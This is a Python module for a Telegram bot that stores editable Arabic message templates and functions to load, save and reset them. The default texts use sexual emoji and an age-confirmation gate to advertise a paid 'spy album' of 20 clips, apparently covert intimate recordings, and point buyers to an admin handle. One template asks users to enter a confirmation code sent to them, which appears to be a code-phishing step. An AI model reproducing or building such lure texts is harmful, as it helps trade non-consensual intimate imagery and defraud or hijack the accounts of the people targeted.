# user_messages.py — نصوص تظهر للمستخدمين (قابلة للتعديل من أدمن A1)
import json
import os
import logging

import database
from config import REGISTRATION_LINK

logger = logging.getLogger(__name__)

MESSAGES_PATH = os.path.join(database.DATA_DIR, "user_messages.json")

DEFAULT_ALREADY_REGISTERED = (
    "✅ أنت مسجل مسبقاً!\n\n"
    "🔗 رابط الفيديو🫦🫦:\n{link}\n"
    "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💋🫦\n"
    "@N01_n0one"
)

DEFAULT_REGISTRATION_SUCCESS = (
    "✅ تم التسجيل بنجاح!\n\n"
    "🔗 رابط الفيديو🫦💋:\n{link}\n"
    "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💗💞\n"
    "@N01_n0one"
)

DEFAULT_START_MSG = "💋 للوصول إلى البوت، يجب عليك تأكيد أن عمرك يزيد عن 18 عامًا!🔞"
DEFAULT_CONFIRM_BUTTON = "عمري أكثر من 18 عامًا! ✔️"
DEFAULT_ENTER_CODE_MSG = (
    "✅ أدخل رمز التأكيد الذي أرسلناه إليك.\n\n"
    'يمكنك الحصول على الرمز من <a href="https://t.me/+42777">هنا</a>'
)
DEFAULT_CONFIRM_AGE_MSG = "💦 اضغط الزر! ❤️‍🔥\n👇👇 (عمري فوق ١٨ عامًا!) 👇👇"

DEFAULTS = {
    "already_registered": DEFAULT_ALREADY_REGISTERED,
    "registration_success": DEFAULT_REGISTRATION_SUCCESS,
    "registration_link": REGISTRATION_LINK,
    "start_msg": DEFAULT_START_MSG,
    "confirm_button": DEFAULT_CONFIRM_BUTTON,
    "enter_code_msg": DEFAULT_ENTER_CODE_MSG,
    "confirm_age_msg": DEFAULT_CONFIRM_AGE_MSG,
}

LABELS = {
    "already_registered": "مسجل مسبقاً (/start)",
    "registration_success": "بعد التسجيل بنجاح",
    "registration_link": "رابط الفيديو ({link})",
    "start_msg": "رسالة البداية (/start)",
    "confirm_button": "نص زر التأكيد",
    "enter_code_msg": "رسالة طلب الكود",
    "confirm_age_msg": "رسالة التحذير (بعد الضغط)",
}


def _load_raw() -> dict:
    if not os.path.isfile(MESSAGES_PATH):
        return {}
    try:
        with open(MESSAGES_PATH, encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, dict) else {}
    except Exception as e:
        logger.warning("user_messages load: %s", e)
        return {}


def _save_raw(data: dict) -> None:
    os.makedirs(database.DATA_DIR, exist_ok=True)
    with open(MESSAGES_PATH, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def get_link() -> str:
    stored = (_load_raw().get("registration_link") or "").strip()
    return stored or REGISTRATION_LINK


def render(key: str) -> str:
    """نص جاهز للإرسال للمستخدم."""
    data = {**DEFAULTS, **_load_raw()}
    if key == "registration_link":
        return get_link()
    template = data.get(key) or DEFAULTS.get(key, "")
    return template.replace("{link}", get_link())


def get_template(key: str) -> str:
    data = {**DEFAULTS, **_load_raw()}
    if key == "registration_link":
        return get_link()
    return data.get(key) or DEFAULTS.get(key, "")


def set_message(key: str, text: str) -> None:
    if key not in DEFAULTS:
        raise ValueError(f"unknown message key: {key}")
    data = _load_raw()
    data[key] = text.strip()
    _save_raw(data)


def reset_message(key: str) -> None:
    if key not in DEFAULTS:
        raise ValueError(f"unknown message key: {key}")
    data = _load_raw()
    data.pop(key, None)
    _save_raw(data)


def reset_all() -> None:
    if os.path.isfile(MESSAGES_PATH):
        os.remove(MESSAGES_PATH)
